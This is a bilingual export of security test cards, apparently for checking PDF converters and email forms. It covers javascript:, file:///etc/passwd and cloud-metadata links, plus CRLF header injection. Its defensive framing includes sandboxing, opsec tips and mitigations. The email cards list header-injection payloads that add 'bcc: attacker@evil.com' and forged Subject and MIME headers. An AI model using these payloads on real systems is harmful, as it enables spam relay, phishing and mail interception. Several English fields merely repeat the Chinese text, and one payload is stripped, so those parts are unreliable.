description.en: Uses a javascript: anchor to test whether a converter preserves the script scheme as a PDF URI or action and whether an isolated viewer executes a simple alert.

prerequisites.zh: 输出 PDF 可离线检查动作字典，测试查看器运行在无网络、无本地文件权限的沙箱
prerequisites.en: Output action dictionaries can be inspected offline and the test viewer runs in a sandbox without network or local-file access.

prerequisites.zh: 只允许原始 app.alert 常量提示，不添加文档数据读取、提交或持久动作
prerequisites.en: Only the original constant app.alert prompt is allowed, with no document-data read, submission, or persistent action.

title.zh: JavaScript URI 锚点

description.zh: 生成后先离线检查 scheme/动作，再在隔离查看器手动激活一次；不得扩展脚本或在常用工作站打开。
description.en: Inspect the scheme or action offline after generation, then activate it once in an isolated viewer; do not extend the script or open it on a normal workstation.

analysis.zh: 最强证据是特定 PDF 查看器执行被转换后的常量动作。若转换器删除 scheme、只创建不可执行 URI、查看器拦截或仅弹警告，则不是脚本执行；结果也不能外推到其他查看器。
analysis.en: The strongest evidence is a specific PDF viewer executing the converted constant action. If the converter removes the scheme, creates only a nonexecuting URI, or the viewer blocks or merely warns, script execution is unproven and cannot be generalized to other viewers.

opsecTips.zh: 查看器断网并使用空白临时 Profile，只允许一次 app.alert，禁止访问文档字段或主机 API
opsecTips.en: Run the viewer offline with an empty temporary profile and allow one app.alert only, with no document-field or host-API access.

opsecTips.zh: 验证后销毁查看器 Profile、PDF、动作导出和截图中的测试标识
opsecTips.en: After validation destroy the viewer profile, PDF, action export, and test identifiers in screenshots.

title.zh: 离线检查 PDF 动作基线
title.en: Inspect the PDF action baseline offline

description.zh: 生成空链接与普通链接对照并枚举输出动作，不执行任何内容。
description.en: Generate no-link and ordinary-link controls and enumerate output actions without execution.

title.zh: 生成单一常量动作

description.zh: 提交原锚点一次并保存输入、输出哈希与动作字典。
description.en: Submit the original anchor once and preserve input, output hash, and action dictionary.

attackChain.payload: Click

title.zh: 在沙箱查看器激活

description.zh: 手动点击并只记录常量提示、查看器版本和策略，不授予额外权限。
description.en: Click manually and record only the constant prompt, viewer version, and policy without granting extra permissions.

title.zh: 删除主动动作并回归

description.zh: 应用 scheme/动作清理后重新生成，确认普通链接保留而脚本动作消失。
description.en: After scheme and action sanitization regenerate to preserve ordinary links while removing script actions.

overview.zh: HTML javascript: URI 与 PDF JavaScript 动作并非同一规范对象，转换器可能删除、保留为普通 URI 或映射为动作。该卡只验证转换和查看器执行边界。
overview.en: An HTML javascript: URI and a PDF Java Script action are not the same standards object; a converter may remove it, preserve it as a URI, or map it to an action. This card tests only conversion and viewer execution boundaries.

vulnerability.zh: 若不可信 HTML 可生成主动 PDF 内容，查看器策略或用户信任可能允许脚本交互。常量 alert 成功只证明活动内容执行，不证明 Cookie、文件、网络访问或浏览器 XSS。
vulnerability.en: If untrusted HTML can create active PDF content, viewer policy or user trust may permit script interaction. A constant alert proves active-content execution only and does not prove cookie, file, network access, or browser XSS.

exploitation.zh: 比较无 href、https href 与 javascript href 三份 PDF 的动作对象；在无数据文档和沙箱查看器中点击一次。阳性要求动作被保留且显示预期常量提示；仅源码含 javascript 或查看器警告不是执行。
exploitation.en: Compare action objects in PDFs with no href, an HTTPS href, and the javascript href and click once in a sandbox viewer with an empty document. A positive preserves the action and displays the expected constant prompt; javascript text or a viewer warning alone is not execution.

mitigation.zh: 转换前拒绝非 http/https/站内 scheme，生成后清除 JavaScript、Launch、URI 等非批准动作，并采用默认禁用活动内容的查看器策略。
mitigation.en: Reject nonapproved schemes before conversion, remove Java Script, Launch, URI, and other unapproved actions after generation, and use viewer policy that disables active content by default.

name.zh: PDF 本地 File URI 链接

description.zh: 使用 file:///etc/passwd 锚点验证转换器是否保留本地文件 URI，以及 PDF 查看器在用户激活时的 scheme 与文件权限策略。
description.en: Uses a file:///etc/passwd anchor to test whether the converter preserves a local-file URI and how PDF viewer scheme and filesystem policy behave on user activation.

subCategory.zh: PDF 本地文件链接策略

prerequisites.zh: 原系统路径在验证前替换为沙箱内只含随机标记的文件
prerequisites.en: The original system path is replaced before validation with a sandbox file containing only a random marker.

prerequisites.zh: 查看器以无宿主文件权限身份运行，能够记录 URI 激活、提示与实际文件调用
prerequisites.en: The viewer runs without host-file privileges and can record URI activation, prompts, and actual file calls.

title.zh: File URI 锚点

description.zh: 保持原行用于追溯，实际生成时把路径改为沙箱 marker.txt；不访问 `/etc/passwd`。
description.en: Retain the original for traceability and replace the path with sandbox marker.txt during generation; do not access /etc/passwd.

analysis.zh: 该条只能证明 PDF 客户端对本地 file URI 的处理。生成器无文件事件时不是服务端文件读取；查看器仅提示或尝试打开也不等于内容泄露，必须看到沙箱标记或等价审计证据。
analysis.en: 该条只能证明 PDF 客户端对本地 file URI 的处理。生成器无文件事件时不是服务端文件读取；查看器仅提示或尝试打开也不等于内容泄露，必须看到沙箱标记或等价审计证据。

opsecTips.zh: 只指向临时标记文件并以无宿主挂载权限查看；首次文件调用后立即停止
opsecTips.en: Point only to the temporary marker and view without host-mount privileges; stop after the first file call.

opsecTips.zh: 测试后卸载沙箱目录、删除 PDF 和查看器最近文件记录
opsecTips.en: After testing unmount the sandbox directory and delete the PDF and viewer recent-file records.

title.zh: 准备沙箱标记文件

description.zh: 文件只含随机常量，路径位于临时挂载且文件审计开启。
description.en: The file contains only a random constant in a temporary mount with file auditing enabled.

title.zh: 替换路径并生成 PDF
title.en: Replace the path and generate the PDF

description.zh: 只改 href 路径，保存输出哈希并检查生成器没有文件读取。
description.en: Change only the href path, preserve the output hash, and verify the generator performed no file read.

attackChain.payload: Read

title.zh: 在查看器分层验证

description.zh: 记录提示、文件调用和标记可见性，区分链接激活与内容泄露。
description.en: Record prompts, file calls, and marker visibility and distinguish link activation from content disclosure.

title.zh: 阻断 File URI 并清理
title.en: Block file URIs and clean up

description.zh: 修复后重放普通 HTTPS 与 file 对照，随后删除 PDF、标记文件和审计导出。
description.en: After remediation replay ordinary HTTPS and file controls, then delete the PDF, marker file, and audit export.

overview.zh: 锚点 file URI 通常成为客户端 PDF 链接，而不是生成服务器立即读取文件。风险取决于查看器是否允许用户激活本地 scheme、是否提示，以及是否能显示或传递文件内容。
overview.en: An anchor file URI normally becomes a client-side PDF link rather than causing the generation server to read a file immediately. Risk depends on viewer activation policy, prompts, and whether file content can be displayed or passed onward.

vulnerability.zh: 若查看器对不可信文档放宽本地文件链接，用户点击可能暴露路径存在性或打开本地资源。仅保留 URI、出现安全提示或打开失败都不等于文件内容泄露。
vulnerability.en: If a viewer permits local-file links from untrusted documents, a user click may expose path existence or open a local resource. Preserving the URI, showing a security prompt, or failing to open it does not equal file-content disclosure.

exploitation.zh: 用沙箱 marker.txt 生成 PDF，先离线检查链接，再手动点击并关联查看器文件审计。阳性按层记录：链接保留、文件调用、标记内容可见；生成器侧无文件访问是预期。
exploitation.en: Generate the PDF with sandbox marker.txt, inspect the link offline, then click manually and correlate viewer file audit. Record levels separately: preserved link, file call, and visible marker content; no generator-side file access is expected.

mitigation.zh: 转换前拒绝 file scheme，生成后移除本地 URI 动作；查看器默认阻断不可信文档访问本地文件，并把业务附件通过受控对象 ID 提供。
mitigation.en: Reject the file scheme before conversion, remove local URI actions after generation, block untrusted-document local-file access in the viewer by default, and provide business attachments through controlled object identifiers.

name.zh: PDF 元数据地址 HTTP 链接

description.zh: 使用指向 169.254.169.254 的锚点验证 PDF 是否保留特殊地址链接及客户端点击策略，并明确它不是渲染器 SSRF。
description.en: Uses an anchor targeting 169.254.169.254 to test PDF preservation and client click policy for a special-address link while explicitly distinguishing it from renderer SSRF.

prerequisites.zh: 禁止访问真实 169.254.169.254，链接在生成前改为隔离链路本地模拟服务
prerequisites.en: Access to real 169.254.169.254 is prohibited and the link is changed before generation to an isolated link-local simulation service.

prerequisites.zh: 生成器和查看器网络分别可观测，可区分服务端自动请求与客户端手动点击
prerequisites.en: 生成器和查看器网络分别可观测，可区分服务端自动请求与客户端手动点击

title.zh: 元数据 HTTP 锚点

description.zh: 实际测试替换为隔离模拟地址，只检查 PDF 注释和手动导航；绝不请求云元数据。
description.en: Replace the destination with an isolated simulator during testing and inspect only the PDF annotation and manual navigation; never request cloud metadata.

analysis.zh: 网络来源决定结论：只有 PDF 查看器点击产生请求时，这是客户端链接行为；生成服务器自动抓取才是 SSRF。链接中出现 169.254.169.254、查看器预览 URL 或无响应均不能单独证明任何一类访问。
analysis.en: 网络来源决定结论：只有 PDF 查看器点击产生请求时，这是客户端链接行为；生成服务器自动抓取才是 SSRF。链接中出现 169.254.169.254、查看器预览 URL 或无响应均不能单独证明任何一类访问。

opsecTips.zh: 绝不连接真实云元数据；模拟端点无凭证、无重定向且单次响应后关闭
opsecTips.en: Never connect to real cloud metadata; the simulator has no credentials or redirects and closes after one response.

opsecTips.zh: 验证后删除 PDF、模拟端点、查看器缓存和网络日志中的令牌
opsecTips.en: After validation delete the PDF, simulator, viewer cache, and tokens from network logs.

title.zh: 分离生成器与查看器网络

description.zh: 为两个组件设置独立日志和出口，部署只返回随机标记的模拟端点。
description.en: Configure separate logs and egress for both components and deploy a simulator returning only a random marker.

title.zh: 改写地址并生成文档
title.en: Rewrite the address and generate the document

description.zh: 替换真实元数据地址，生成一次并检查注释及服务器零请求基线。
description.en: Replace the real metadata address, generate once, and inspect the annotation and server zero-request baseline.

attackChain.payload: Metadata

title.zh: 手动点击并确认客户端来源
title.en: Click manually and confirm client origin

description.zh: 只允许一次查看器请求，匹配标记、来源和时间，禁止重定向。
description.en: Allow one viewer request only and match marker, source, and time with redirects disabled.

title.zh: 应用特殊地址策略

description.zh: 修复后生成并点击对照，确认普通批准域可用而模拟链路本地地址被阻断。
description.en: After remediation generate and click controls to preserve approved domains while blocking the simulated link-local destination.

overview.zh: HTML 链接目标通常不会在 PDF 生成时被抓取，而是作为可点击注释保留。特殊地址使链接具有高风险外观，但实际请求源必须通过网络日志判定。
overview.en: An HTML link destination is normally preserved as a clickable annotation rather than fetched during PDF generation. A special address makes the link look high risk, but network logs must identify the actual request source.

vulnerability.zh: 不可信 PDF 若能引导用户访问客户端可达的链路本地服务，可能触发本地交互；这依赖点击和客户端网络。只有生成服务自动请求该目标时才属于 SSRF，而本卡不假设该行为。
vulnerability.en: An untrusted PDF may guide a user to a link-local service reachable by the client, but this requires a click and client network access. It becomes SSRF only if the generation service automatically requests the destination, which this card does not assume.

exploitation.zh: 生成时监控服务器网络并确认无请求，再在隔离查看器点击改写后的模拟链接，记录客户端来源和单一标记响应。若生成阶段出现请求，应转入独立渲染器 SSRF 评估。
exploitation.en: Monitor generator networking and confirm no request, then click the rewritten simulator link in an isolated viewer and record client source and one marker response. If a generation-time request occurs, move it to a separate renderer-SSRF assessment.

mitigation.zh: 移除或重写指向回环、链路本地、私网和保留地址的 PDF 链接，查看器对特殊地址显示阻断提示；对确需链接的业务使用批准域映射。
mitigation.en: Remove or rewrite PDF links to loopback, link-local, private, and reserved addresses, have viewers block or warn on special destinations, and map legitimate business links to approved domains.

name.zh: 邮件 Bcc/Cc Header 注入
name.en: Email Bcc and Cc Header Injection

description.zh: 验证邮件表单字段中的换行是否突破单一 Header 值并注入额外 Bcc 或 Cc 收件人。
description.en: Tests whether newline characters in mail-form fields escape one header value and inject additional Bcc or Cc recipients.

subCategory.zh: 邮件收件人 Header 注入

prerequisites.zh: 用户邮件字段在解码后直接进入单个 RFC 5322 Header 值，应用/邮件库未拒绝 CR/LF，最终原始 MIME 与 SMTP envelope 可观察。
prerequisites.en: A decoded user mail field enters one RFC 5322 header value without CR or LF rejection, and final raw MIME plus SMTP envelope are observable.

prerequisites.zh: 使用隔离 SMTP sink、测试域和专用收件箱，注入地址为无投递 marker mailbox，保存应用参数、raw message、envelope recipients 和队列 ID。
prerequisites.en: An isolated SMTP sink, test domain, and dedicated mailboxes use a nondelivering marker recipient, preserving application parameter, raw message, envelope recipients, and queue identifier.

title.zh: CRLF注入添加BCC/CC
title.en: Validation step 1 for Email Bcc and Cc Header Injection

execution.command:
\nbcc: attacker@evil.com
\r\nbcc: attacker@evil.com
\nBcc: attacker@evil.com
\r\nBcc: attacker@evil.com
\ncc: attacker@evil.com
\r\ncc: attacker@evil.com
\nCc: attacker@evil.com
\r\nCc: attacker@evil.com
%0abcc: attacker@evil.com
%0dBcc: attacker@evil.com
%0d%0abcc: attacker@evil.com
%0d%0aBcc: attacker@evil.com
\nbcc:attacker@evil.com
\r\nbcc:attacker@evil.com
\nbcc: attacker1@evil.com,attacker2@evil.com
\r\nbcc: attacker1@evil.com,attacker2@evil.com
%0abcc: attacker1@evil.com,attacker2@evil.com
%0d%0abcc: attacker1@evil.com,attacker2@evil.com
\nbcc: attacker@evil.com\ncc: attacker2@evil.com
\r\nbcc: attacker@evil.com\r\ncc: attacker2@evil.com

description.zh: CRLF注入添加BCC/CC包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Email Bcc and Cc Header Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是换行突破原 Header 值并在最终 MIME 创建独立 Bcc/Cc，且 SMTP envelope/隔离 sink 包含新增 marker 收件人。 假阳性边界：输入字符串含 bcc、Header 在 UI/日志中换行、邮件库折叠为同一值、raw MIME 无新字段、只改显示头但 envelope 未新增、sink 自动抄送均不是注入。
analysis.en: Positive evidence requires the newline to escape the original header value and create a distinct Bcc or Cc in final MIME, with the added marker recipient present in the SMTP envelope or isolated sink. False-positive boundary: A bcc substring, line breaks in UI or logs, library folding into one value, no new field in raw MIME, display-header changes without a new envelope recipient, or sink-side auto-copy does not prove injection.

opsecTips.zh: Bcc/Cc 注入只使用隔离不投递地址且一封邮件；出现真实收件人、外部域投递、队列重试、退信、通知或多封发送时停止。
opsecTips.en: Bcc or Cc injection uses one isolated nondelivering address and one message; stop on real recipients, external-domain delivery, queue retries, bounces, notifications, or multiple sends.

opsecTips.zh: 删除隔离邮件/队列/marker 收件箱，清理应用和 SMTP 日志，关闭 sink，恢复 CRLF 校验并重放正常多收件人流程。
opsecTips.en: Delete isolated messages, queues, and marker mailboxes, clear application and SMTP logs, close the sink, restore CRLF validation, and replay normal multi-recipient flows.

title.zh: 捕获正常 SMTP 信封

description.zh: 向隔离邮件服务发送基线消息并保存信封收件人、原始 Header 和正文边界。
description.en: Send a baseline message to an isolated mail service and preserve envelope recipients, raw headers, and body boundaries.

title.zh: 注入额外 Bcc/Cc
title.en: Inject additional Bcc and Cc recipients

description.zh: 回放原始换行变体并比较 SMTP 信封与 MIME Header 中是否出现未授权地址。
description.en: Replay the original newline variants and compare the SMTP envelope and MIME headers for unauthorized addresses.

attackChain.payload:
\nbcc: attacker@evil.com
\r\nbcc: attacker@evil.com
\nBcc: attacker@evil.com
\r\nBcc: attacker@evil.com
\ncc: attacker@evil.com
\r\ncc: attacker@evil.com
\nCc: attacker@evil.com
\r\nCc: attacker@evil.com
%0abcc: attacker@evil.com
%0dBcc: attacker@evil.com
%0d%0abcc: attacker@evil.com
%0d%0aBcc: attacker@evil.com
\nbcc:attacker@evil.com
\r\nbcc:attacker@evil.com
\nbcc: attacker1@evil.com,attacker2@evil.com
\r\nbcc: attacker1@evil.com,attacker2@evil.com
%0abcc: attacker1@evil.com,attacker2@evil.com
%0d%0abcc: attacker1@evil.com,attacker2@evil.com
\nbcc: attacker@evil.com\ncc: attacker2@evil.com
\r\nbcc: attacker@evil.com\r\ncc: attacker2@evil.com

title.zh: 切换结构化邮件构造

description.zh: 使用类型化收件人 API 和换行拒绝后重放，确认正常抄送可用且注入地址消失。
description.en: Replay after typed recipient APIs and newline rejection to preserve legitimate copies while removing injected addresses.

overview.zh: 原集合覆盖字面与百分号编码的 LF/CRLF、大小写和多收件人形式，目标 Sink 是应用构造的 RFC 邮件 Header。载荷出现在 HTTP 请求或邮件正文中不算成功，必须在测试 SMTP 信封或邮件 Header 中看到额外收件人。
overview.en: The source covers literal and percent-encoded LF or CRLF, case variants, and multiple recipients targeting application-built mail headers. Appearance in an HTTP request or message body is not success; an extra recipient must appear in the test SMTP envelope or message headers.

vulnerability.zh: 应用把 name、subject、reply-to 等用户字段直接拼进原始邮件头，或重复解码换行时，攻击者可结束当前 Header 并新增 Bcc/Cc。不同邮件库可能自动拒绝换行，因此 500、发送失败或文本回显都不是漏洞证据。
vulnerability.en: If an application concatenates user fields such as name, subject, or reply-to into raw mail headers or decodes newlines repeatedly, an attacker can terminate the current header and add Bcc or Cc. Mail libraries may reject newlines automatically, so a 500, send failure, or text echo is not evidence.

exploitation.zh: 步骤一向隔离 SMTP 捕获器发送正常邮件并记录 envelope recipients 与原始 MIME；步骤二逐项回放原始 Bcc/Cc 变体，保持授权收件人固定并比较捕获结果；步骤三换用结构化邮件 API 后重放，排除捕获器界面折行、正文引用或预配置抄送造成的假阳性。
exploitation.en: First send a normal message to an isolated SMTP catcher and record envelope recipients and raw MIME. Replay each original Bcc and Cc variant while keeping the authorized recipient fixed and compare captured results. Retest with a structured mail API to exclude UI wrapping, body quoting, or preconfigured copies as false positives.

mitigation.zh: 使用邮件库结构化设置 To/Cc/Bcc 而不拼接原始 Header；对所有 Header 字段拒绝解码后 CR/LF 并限制收件人 Schema；将允许收件人从服务端业务对象解析，同时审计异常多收件人与外部域。
mitigation.en: 使用邮件库结构化设置 To/Cc/Bcc 而不拼接原始 Header；对所有 Header 字段拒绝解码后 CR/LF 并限制收件人 Schema；将允许收件人从服务端业务对象解析，同时审计异常多收件人与外部域。

name.zh: 邮件 Subject Header 注入

description.zh: 验证邮件字段中的换行是否新增或覆盖 Subject 及自定义 Header，并改变最终 MIME Header 结构。
description.en: Tests whether newlines in mail fields add or override Subject and custom headers and alter the final MIME header structure.

subCategory.zh: 邮件主题 Header 注入

prerequisites.zh: 可控主题或相邻字段未经换行校验进入邮件 Header serializer，编码词、折行和下游 MTA 重写后的原始 MIME 可获取。
prerequisites.en: A controlled subject or adjacent field enters a mail header serializer without newline validation, with encoded-word, folding, and downstream MTA-rewritten raw MIME available.

prerequisites.zh: 隔离 SMTP sink 使用唯一 X-Test-Subject marker，保存提交值、应用生成 Header、MTA 后 raw message 和队列 ID，不发送外部邮件。
prerequisites.en: An isolated SMTP sink uses a unique X-Test-Subject marker and preserves submitted value, application-generated headers, post-MTA raw message, and queue identifier without external delivery.

title.zh: Subject注入
title.en: Validation step 1 for Email Subject Header Injection

execution.command:
\nSubject: Injected Subject
\r\nSubject: Injected Subject
%0aSubject: Injected Subject
%0d%0aSubject: Injected Subject
\nSubject: spam message
\r\nSubject: spam message
%0aSubject: spam message
%0d%0aSubject: spam message
\nX-Injected: true
\r\nX-Injected: true

description.zh: Subject注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Email Subject Header Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是可控 CR/LF 在最终 MIME 中结束原 Subject 并创建/覆盖新的独立 Subject 或测试 Header，raw message 与输入对应。 假阳性边界：邮件客户端视觉换行、RFC 合法折行、主题显示截断、encoded-word 解码、日志多行、第二 Subject 被 MTA 丢弃或仅请求参数变化均不是有效注入。
analysis.en: Positive evidence requires controlled CR or LF to terminate the original Subject and create or override a distinct Subject or test header in final MIME, with raw message tied to input. False-positive boundary: Visual wrapping in a mail client, legal RFC folding, truncated display, encoded-word decoding, multiline logs, a second Subject dropped by the MTA, or request-only changes does not prove injection.

opsecTips.zh: Subject 测试只注入 X-Test 标头且单封隔离邮件；出现真实 Header 覆盖、外部投递、垃圾邮件规则、队列重试或通知时停止。
opsecTips.en: Subject testing injects an X-Test header in one isolated message only; stop on real-header override, external delivery, spam-rule effects, queue retries, or notifications.

opsecTips.zh: 删除 sink 邮件/队列/marker，清理客户端缓存和应用/MTA 日志，恢复 Header 库换行拒绝并回归 Unicode 主题。
opsecTips.en: Delete sink messages, queues, and markers, clear client caches and application or MTA logs, restore newline rejection in the header library, and regress Unicode subjects.

title.zh: 保存唯一主题 MIME 基线

description.zh: 向隔离 SMTP 服务发送正常主题并保存折叠前后的完整原始 Header。
description.en: Send a normal unique subject to an isolated SMTP service and preserve complete raw headers before and after folding.

title.zh: 插入第二邮件 Header

description.zh: 回放原始换行与编码变体并比较 Subject 数量、X-Injected 值和客户端显示。
description.en: Replay the original newline and encoded variants and compare Subject count, X-Injected values, and client display.

attackChain.payload:
\nSubject: Injected Subject
\r\nSubject: Injected Subject
%0aSubject: Injected Subject
%0d%0aSubject: Injected Subject
\nSubject: spam message
\r\nSubject: spam message
%0aSubject: spam message
%0d%0aSubject: spam message
\nX-Injected: true
\r\nX-Injected: true

title.zh: 验证主题属性 API

description.zh: 切换结构化 Subject 设置并拒绝控制字符后重放，确认合法 Unicode 主题保留且新 Header 无法生成。
description.en: Replay after structured Subject assignment and control-character rejection to preserve valid Unicode subjects while preventing new headers.

overview.zh: 原命令使用 LF、CRLF 与百分号编码插入第二个 Subject 或 X-Injected Header。主题显示变化可能受到邮件客户端折叠和重复 Header 策略影响，审计必须查看 SMTP 捕获器保存的原始 MIME，而不是只看 UI。
overview.en: The source uses LF, CRLF, and percent encoding to insert a second Subject or X-Injected header. Display changes depend on client folding and duplicate-header policy, so review must inspect raw MIME from an SMTP catcher rather than only the UI.

vulnerability.zh: 应用把联系人姓名、反馈标题等不可信值拼接到 Subject Header，且未在最终解码后拒绝换行时，攻击者可改变邮件元数据并为后续钓鱼或 Header 注入创造条件。重复 Subject 被客户端忽略也不等于输入安全。
vulnerability.en: If an application concatenates untrusted names or feedback titles into Subject without rejecting newlines after final decoding, an attacker can alter message metadata and enable phishing or further header injection. A client ignoring duplicate Subject does not mean the input path is safe.

exploitation.zh: 步骤一发送包含唯一正常主题的消息并保存原始 MIME；步骤二逐项回放原始 Subject/X-Injected 变体，比较折叠前 Header 数量、顺序和值；步骤三用不同客户端显示与结构化邮件 API 对照，排除 UI 折行、RFC 编码字换行或正文出现 Subject 字样造成的假阳性。
exploitation.en: First send a message with a unique normal subject and preserve raw MIME. Replay each original Subject and X-Injected variant and compare header count, order, and values before folding. Compare several client displays and a structured mail API to exclude UI wrapping, encoded-word folding, or Subject text in the body as false positives.

mitigation.zh: 通过邮件库 Subject 属性设置主题而非拼接 MIME；在所有邮件 Header 输入上拒绝 CR/LF、控制字符和重复解码结果；限制长度与字符集，并在出站网关记录重复或异常 Header。
mitigation.en: Set the subject through the mail library property rather than concatenating MIME. Reject CR, LF, control characters, and repeated-decoding results in every mail-header input. Limit length and character set and log duplicate or anomalous headers at the outbound gateway.

name.zh: 邮件 MIME Content-Type Header 注入

description.zh: 验证用户输入中的换行是否注入 Content-Type、MIME-Version 或 Content-Transfer-Encoding 并改变邮件正文解释。
description.en: Tests whether newlines in user input inject Content-Type, MIME-Version, or Content-Transfer-Encoding headers and change interpretation of the message body.

subCategory.zh: MIME 结构 Header 注入

prerequisites.zh: 用户输入可进入邮件 MIME Header 区，应用允许换行后创建 Content-Type、MIME-Version 或 Content-Transfer-Encoding，最终 MIME 可检查。
prerequisites.en: User input can enter the mail MIME header section and create Content-Type, MIME-Version, or Content-Transfer-Encoding after a newline, with final MIME inspectable.

prerequisites.zh: 隔离 SMTP sink 使用只含固定文本 marker 的两部分 multipart，对照保存应用正文、boundary、raw MIME、MTA 重写和测试客户端解析树。
prerequisites.en: An isolated SMTP sink uses a two-part multipart containing fixed text markers only and preserves application body, boundary, raw MIME, MTA rewriting, and test-client parse tree.

title.zh: Content-Type multipart注入
title.en: Validation step 1 for Email MIME Content-Type Header Injection

execution.command:
\nContent-Type: multipart/mixed; boundary=INJECTED
\r\nContent-Type: multipart/mixed; boundary=INJECTED
%0aContent-Type: multipart/mixed; boundary=INJECTED
%0d%0aContent-Type: multipart/mixed; boundary=INJECTED
\nContent-Type: text/html
\r\nContent-Type: text/html
%0aContent-Type: text/html
%0d%0aContent-Type: text/html
\nMIME-Version: 1.0
\r\nMIME-Version: 1.0
\nContent-Transfer-Encoding: base64
\r\nContent-Transfer-Encoding: base64

description.zh: Content-Type multipart注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Email MIME Content-Type Header Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是换行在最终邮件中建立攻击者控制的 MIME Header/boundary，并使隔离客户端按不同结构解释 marker 正文；raw MIME 与解析树一致。 假阳性边界：Content-Type 字符串出现在正文、MTA 覆盖为安全类型、boundary 不闭合导致纯文本、客户端猜测 HTML、日志换行或请求 parser 接受值均不是 MIME 注入。
analysis.en: Positive evidence requires the newline to create attacker-controlled MIME headers or boundaries in the final message and make the isolated client interpret marker content under a different structure, with raw MIME matching the parse tree. False-positive boundary: Content-Type text in the body, MTA override to a safe type, an unclosed boundary yielding plain text, client HTML guessing, multiline logs, or request-parser acceptance does not prove MIME injection.

opsecTips.zh: MIME 结构测试只含固定文本，不附加文件/HTML/外链；出现真实附件、客户端脚本、外部投递、邮件循环或解析器资源异常时停止。
opsecTips.en: MIME-structure testing contains fixed text only and no files, HTML, or external links; stop on real attachments, client script, external delivery, mail loops, or parser-resource anomalies.

opsecTips.zh: 删除测试 MIME、队列和客户端副本，清理 boundary/marker 日志与缓存，关闭 sink，恢复安全 MIME builder 并回归。
opsecTips.en: Delete test MIME messages, queues, and client copies, clear boundary and marker logs and caches, close the sink, restore a safe MIME builder, and regress.

title.zh: 记录正常 MIME 部件树
title.en: Record the normal MIME part tree

description.zh: 发送 text/plain 基线并保存原始 Header、boundary、编码和客户端渲染结果。
description.en: Send a text/plain baseline and preserve raw headers, boundary, encoding, and client rendering.

title.zh: 注入 MIME 结构 Header

description.zh: 回放原始 Content-Type/MIME 变体并比较捕获器部件树与实际客户端解释。
description.en: Replay the original Content-Type and MIME variants and compare the catcher part tree with actual client interpretation.

attackChain.payload:
\nContent-Type: multipart/mixed; boundary=INJECTED
\r\nContent-Type: multipart/mixed; boundary=INJECTED
%0aContent-Type: multipart/mixed; boundary=INJECTED
%0d%0aContent-Type: multipart/mixed; boundary=INJECTED
\nContent-Type: text/html
\r\nContent-Type: text/html
%0aContent-Type: text/html
%0d%0aContent-Type: text/html
\nMIME-Version: 1.0
\r\nMIME-Version: 1.0
\nContent-Transfer-Encoding: base64
\r\nContent-Transfer-Encoding: base64

title.zh: 改用类型化 MIME 构造

description.zh: 通过结构化 API 生成正文和附件后重放，确认合法 multipart 可用且用户无法新增结构头。
description.en: Replay after structured body and attachment construction to preserve valid multipart content while preventing user-supplied structure headers.

overview.zh: 原集合面向邮件 MIME 头而非 HTTP Content-Type，包含 multipart boundary、text/html、MIME-Version 和传输编码。成功需要最终邮件的 Header/正文边界发生变化，并被目标客户端按注入类型解析。
overview.en: The source targets mail MIME headers rather than HTTP Content-Type and includes multipart boundaries, text/html, MIME-Version, and transfer encoding. Success requires the final message's header or body boundary to change and the target client to parse the injected type.

vulnerability.zh: 应用把用户字段拼进原始邮件 Header，允许 CR/LF 结束上一字段后，攻击者可重定义 MIME 结构、隐藏正文或引入活动 HTML。邮件库可能重写、去重或拒绝这些头，因此仅发送成功不证明注入。
vulnerability.en: When an application concatenates user fields into raw mail headers and permits CR or LF to end a field, an attacker can redefine MIME structure, hide body parts, or introduce active HTML. Mail libraries may rewrite, deduplicate, or reject these headers, so successful sending alone is not proof.

exploitation.zh: 步骤一发送正常 text/plain 邮件并保存原始 Header、boundary 与客户端渲染；步骤二逐项回放原始 MIME Header 变体，在 SMTP 捕获器解析部件树并比较目标客户端显示；步骤三使用邮件库结构化内容 API 对照，排除捕获器自动补头、客户端 HTML 偏好或正文字符串造成的假阳性。
exploitation.en: First send a normal text/plain message and preserve raw headers, boundaries, and client rendering. Replay each original MIME-header variant, parse the part tree at an SMTP catcher, and compare target-client display. Compare a structured mail-content API to exclude catcher-added headers, client HTML preferences, or body strings as false positives.

mitigation.zh: 通过邮件库的 multipart、正文和附件 API 构建 MIME，不接受用户提供原始结构头；拒绝 Header 输入中的 CR/LF 与控制字符；固定允许的内容类型、边界生成和传输编码，并在网关验证 MIME 树。
mitigation.en: Build MIME through mail-library multipart, body, and attachment APIs and never accept raw structural headers from users. Reject CR, LF, and controls in header input. Pin allowed content types, generated boundaries, and transfer encodings and validate the MIME tree at the gateway.

name.zh: HTML 邮件正文内容注入

description.zh: 验证用户输入是否未经净化进入 HTML 邮件正文，保留钓鱼链接、iframe、外部样式或跟踪资源并影响收件人客户端。
description.en: Tests whether unsanitized user input enters an HTML email body and preserves phishing links, iframes, external styles, or tracking resources in recipient clients.

subCategory.zh: HTML 邮件活动内容注入

prerequisites.zh: 用户内容未经上下文净化进入 HTML 邮件正文，目标测试邮件客户端对链接、图片、样式、iframe 和脚本的真实策略已确认。
prerequisites.en: User content enters an HTML mail body without contextual sanitization, with actual policies for links, images, styles, frames, and scripts confirmed in the target test mail client.

prerequisites.zh: 只使用隔离邮箱和自有空链接/像素 token，移除 phishing 文案和 javascript 执行，保存 raw MIME、sanitized DOM、资源请求与用户动作。
prerequisites.en: An isolated mailbox and owned empty link or pixel tokens are used, phishing language and javascript execution are removed, and raw MIME, sanitized DOM, resource requests, and user actions are preserved.

title.zh: 邮件正文HTML注入/XSS
title.en: Validation step 1 for HTML Email Body Content Injection

execution.command:
Injected HTML

Click here Click

description.zh: 邮件正文HTML注入/XSS包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this HTML Email Body Content Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是攻击者 HTML 在目标客户端净化后仍形成非预期活动元素，例如可欺骗链接或自动外部资源请求；脚本 XSS 必须另有实际 marker 执行。 假阳性边界：HTML 邮件正常支持 h1/a、源码含 iframe/script、客户端显示纯文本、外部图片默认阻止、用户必须明确点击安全链接或 Webmail CSP 阻断均不是 XSS。
